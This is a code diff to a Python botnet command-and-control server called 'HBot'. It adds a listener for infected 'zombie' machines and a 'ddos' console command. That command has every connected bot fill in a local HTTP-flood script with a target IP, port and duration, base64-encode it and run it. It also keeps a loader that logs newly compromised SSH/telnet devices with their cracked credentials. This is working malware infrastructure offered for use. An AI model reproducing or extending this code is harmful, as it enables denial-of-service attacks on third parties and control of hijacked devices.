@@ -1,4 +1,4 @@
-from lib import network, database, console
+from lib import network, database, console, tools
 import threading, socket, random, time
 
 class Master(threading.Thread):
@@ -47,9 +47,9 @@ class Master(threading.Thread):
             self.send(content)
         
         data = self.network.recv_packet()
-
+        
         if not data:
-            self.kill('Invalid data recieved')
+            self.kill(f'Invalid data recieved')
             return None
         else:
             return data
@@ -73,7 +73,7 @@ class Master(threading.Thread):
             time.sleep(1)
 
             if self.logged:
-                self.set_title(f'User: {len(self.database.online_user)} | Bots: {self.database.total_ssh_bots + self.database.total_telnet_bots} | Loader: {len(self.database.online_loader)}')
+                self.set_title(f'User: {len(self.database.online_user)} | Bots: {len(self.database.online_zombie)} | Vuln: {self.database.total_ssh_bots + self.database.total_telnet_bots} | Loader: {len(self.database.online_loader)}')
             else:
                 self.kicked_time = int(time.time()) - self.session_time
                 self.set_title(f'Login page | Attemp: {self.login_attemp}/3 | Kicked on: {self.kicked_time}/30s')
@@ -102,7 +102,26 @@ class Master(threading.Thread):
 
     def prompt(self):
         while self.ok:
-            command = self.recv(self.color.fade(f'{self.username}@HBot ~$ ').replace('@', f'{self.color.white}@') + self.color.white)
+            cmd = self.recv(self.color.fade(f'\r{self.username}@HBot ~$ ').replace('@', f'{self.color.white}@') + self.color.white)
+            
+            if not cmd:
+                return
+
+            argument = cmd.split(' ')
+            command = argument[0]
+
+            if command == 'ddos':
+                if len(argument) < 4:
+                    self.send('ddos <method> <ip> <port> <time>')
+                
+                else:
+                    ip = argument[2]
+                    port = argument[3]
+                    time = argument[4]
+                    method = argument[1]
+
+                    for zombie in self.database.online_zombie:
+                        zombie.ddos_payload(ip, port, time, method)
 
     def run(self):
         threading.Thread(target= self.loop_thread).start()
@@ -197,6 +216,63 @@ class Loader(threading.Thread):
 
                     self.console.print_success(f'{self.ip} -> New {device_type} bot "{username}:{password} {ip}:{port}" -> {count} bots')
 
+class Zombie(threading.Thread):
+    def __init__(self, console: console.Console, database: database.Database, socket_session: socket.socket, ip: str, port: int):
+        threading.Thread.__init__(self)
+
+        self.network = network.Network(socket_session)
+        self.database = database
+        self.console = console
+        self.port = port
+        self.ok = True
+        self.ip = ip
+
+        # Temp session storage
+        self.session_time = int(time.time())
+
+    def kill(self, reason: str, send: bool= False):
+        if self.ok:
+            if send:
+                self.send(reason)
+            
+            if self in self.database.online_zombie:
+                self.database.online_zombie.remove(self)
+
+            self.console.print_info(f'{self.ip} -> zombie killed -> {reason}')
+            self.network.close_socket()
+            self.ok = False
+
+    def send(self, content: str):
+        if not self.network.send_packet(content):
+            self.kill('Error when send packet')
+
+    def recv(self, content: str= False):
+        if content:
+            self.send(content)
+        
+        data = self.network.recv_packet()
+
+        if not data:
+            self.kill('Invalid data recieved')
+            return None
+        else:
+            return data
+
+    def loop_thread(self):
+        while self.ok:
+            time.sleep(60)
+            self.send('ping')
+
+    def ddos_payload(self, ip: str, port: str, timeout: str, type: str):
+        if type == 'http':
+            payload = tools.Encoder().base_64(str(open('./payload/http_flood.py', 'r+').read().replace('!ip!', ip).replace('!port!', port).replace('!time!', timeout)).encode())
+        
+        self.send(f'run|{payload}')
+
+    def run(self):
+        threading.Thread(target= self.loop_thread).start()
+        self.database.online_zombie.append(self)
+        
 # Rip this part, anyone optimize ?
 class Handler(threading.Thread):
     def __init__(self, database: database.Database, console: console.Console, color: console.Color):
@@ -225,12 +301,23 @@ class Handler(threading.Thread):
             (socket_session, (ip, port)) = sock.accept()
             Loader(self.console, self.database, socket_session, ip, port).start()
 
+    def zombie_thread(self, port: int):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.bind(('0.0.0.0', port))
+        self.console.print_success(f'Zombie -> online -> port: {port}')
+
+        while True:
+            sock.listen(1000)
+            (socket_session, (ip, port)) = sock.accept()
+            Zombie(self.console, self.database, socket_session, ip, port).start()
+
     def run(self):
         threading.Thread(target= self.master_thread, args= (random.randint(1500, 30000),)).start()
-        threading.Thread(target= self.loader_thread, args= (random.randint(30001, 65000),)).start()
+        threading.Thread(target= self.loader_thread, args= (random.randint(30001, 55000),)).start()
+        threading.Thread(target= self.zombie_thread, args= (random.randint(55001, 65000),)).start()
 
 if __name__ == '__main__':
-    Database = database.Database('mongodb+srv://xxxxxx')
+    Database = database.Database('mongodb+srv://.....')
     Console = console.Console()
     Color = console.Color()
 
